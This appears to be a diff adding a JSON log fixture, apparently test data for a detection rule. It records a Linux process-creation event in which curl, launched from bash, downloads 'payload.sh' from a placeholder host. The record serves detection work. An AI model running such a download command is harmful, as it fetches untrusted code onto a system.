@@ -1,0 +1,10 @@
+{
+  "timestamp": "2026-09-03T02:00:00Z",
+  "host": "ubuntu-01",
+  "product": "linux",
+  "category": "process_creation",
+  "Image": "/usr/bin/curl",
+  "CommandLine": "curl http://example.com/payload.sh",
+  "User": "prashant",
+  "ParentImage": "/bin/bash"
+}
